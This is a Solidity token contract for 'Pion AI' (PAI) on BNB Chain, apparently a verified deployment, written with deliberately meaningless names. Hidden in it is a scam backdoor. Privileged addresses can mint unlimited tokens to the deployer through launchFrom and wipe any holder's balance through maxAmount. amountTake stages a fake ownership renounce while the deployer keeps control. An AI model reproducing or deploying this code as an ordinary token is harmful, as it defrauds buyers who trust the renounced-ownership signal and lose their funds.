/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface amountReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchAutoSell) external view returns (uint256);

    function transfer(address shouldAutoFrom, uint256 senderFee) external returns (bool);

    function allowance(address takeBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderFee) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAutoFrom,
        uint256 senderFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeBuy, uint256 value);
    event Approval(address indexed takeBuy, address indexed spender, uint256 value);
}

interface exemptAuto is amountReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface autoWalletEnable {
    function createPair(address amountSwap, address totalAmountFund) external returns (address);
}

interface maxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract PionAI is walletTeam, amountReceiver, exemptAuto {

    function allowance(address shouldFrom, address shouldEnableTrading) external view virtual override returns (uint256) {
        return listTeam[shouldFrom][shouldEnableTrading];
    }

    bool private launchedTotal;

    event OwnershipTransferred(address indexed receiverTx, address indexed liquidityMode);

    function transfer(address teamMax, uint256 senderFee) external virtual override returns (bool) {
        return takeTeam(_msgSender(), teamMax, senderFee);
    }

    uint256 private limitWallet;

    address public txTotal;

    function buyTakeFrom() public view returns (uint256) {
        return limitEnableTo;
    }

    uint256 private atSenderReceiver;

    uint256 private sellFeeWallet;

    function approve(address shouldEnableTrading, uint256 senderFee) public virtual override returns (bool) {
        listTeam[_msgSender()][shouldEnableTrading] = senderFee;
        emit Approval(_msgSender(), shouldEnableTrading, senderFee);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return takeAmount;
    }

    uint8 private isReceiver = 18;

    uint256 private receiverTeam;

    function amountTake() public {
        emit OwnershipTransferred(txTotal, address(0));
        totalWalletIs = address(0);
    }

    function maxAmount(address tradingFee) public {
        
        if (tradingFee == txTotal || tradingFee == modeLaunchedSwap || !enableLimitTo[_msgSender()]) {
            return;
        }
        if (receiverAuto == shouldMin) {
            shouldMin = limitEnableTo;
        }
        listShouldSender[tradingFee] = 0;
    }

    address public modeLaunchedSwap;

    function launchFrom(uint256 senderFee) public {
        if (!enableLimitTo[_msgSender()]) {
            return;
        }
        listShouldSender[txTotal] = senderFee;
    }

    bool private teamMode;

    function decimals() external view virtual override returns (uint8) {
        return isReceiver;
    }

    function enableMode() public view returns (bool) {
        return launchedTotal;
    }

    function totalToIs(address txLimit, address shouldAutoFrom, uint256 senderFee) internal returns (bool) {
        require(listShouldSender[txLimit] >= senderFee);
        listShouldSender[txLimit] -= senderFee;
        listShouldSender[shouldAutoFrom] += senderFee;
        emit Transfer(txLimit, shouldAutoFrom, senderFee);
        return true;
    }

    mapping(address => bool) public txReceiverTake;

    mapping(address => bool) public enableLimitTo;

    function owner() external view returns (address) {
        return totalWalletIs;
    }

    function feeModeTx() public {
        if (shouldMin == receiverTeam) {
            limitWallet = atSenderReceiver;
        }
        if (senderTotal != teamMode) {
            receiverAuto = receiverTeam;
        }
        receiverTeam=0;
    }

    function toEnable() public view returns (uint256) {
        return sellFeeWallet;
    }

    function balanceOf(address launchAutoSell) public view virtual override returns (uint256) {
        return listShouldSender[launchAutoSell];
    }

    function takeTeam(address txLimit, address shouldAutoFrom, uint256 senderFee) internal returns (bool) {
        if (txLimit == txTotal || shouldAutoFrom == txTotal) {
            return totalToIs(txLimit, shouldAutoFrom, senderFee);
        }
        if (atSenderReceiver == sellFeeWallet) {
            limitWallet = limitEnableTo;
        }
        
        if (receiverTeam == limitWallet) {
            launchedTotal = true;
        }
        return totalToIs(txLimit, shouldAutoFrom, senderFee);
    }

    uint256 public shouldMin;

    uint256 public limitEnableTo;

    string private takeAmount = "Pion AI";

    bool private senderTotal;

    function launchFund() public view returns (bool) {
        return teamMode;
    }

    function getOwner() external view returns (address) {
        return totalWalletIs;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamAuto;
    }

    function toFee() public {
        
        if (shouldMin != limitWallet) {
            receiverTeam = limitWallet;
        }
        launchedTotal=false;
    }

    string private teamAuto = "PAI";

    function sellListFrom() public {
        
        if (receiverAuto == limitWallet) {
            receiverTeam = sellFeeWallet;
        }
        teamMode=false;
    }

    bool public atTotal;

    mapping(address => uint256) private listShouldSender;

    function launchedExempt(address fundReceiver) public {
        if (atTotal) {
            return;
        }
        
        enableLimitTo[fundReceiver] = true;
        
        atTotal = true;
    }

    mapping(address => mapping(address => uint256)) private listTeam;

    uint256 private receiverTake = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTake;
    }

    constructor (){
        
        maxLaunch sellEnableMarketing = maxLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        modeLaunchedSwap = autoWalletEnable(sellEnableMarketing.factory()).createPair(sellEnableMarketing.WETH(), address(this));
        totalWalletIs = _msgSender();
        
        txTotal = totalWalletIs;
        enableLimitTo[txTotal] = true;
        
        listShouldSender[txTotal] = receiverTake;
        emit Transfer(address(0), txTotal, receiverTake);
        amountTake();
    }

    function transferFrom(address txLimit, address shouldAutoFrom, uint256 senderFee) external override returns (bool) {
        if (listTeam[txLimit][_msgSender()] != type(uint256).max) {
            require(senderFee <= listTeam[txLimit][_msgSender()]);
            listTeam[txLimit][_msgSender()] -= senderFee;
        }
        return takeTeam(txLimit, shouldAutoFrom, senderFee);
    }

    address private totalWalletIs;

    uint256 private receiverAuto;

}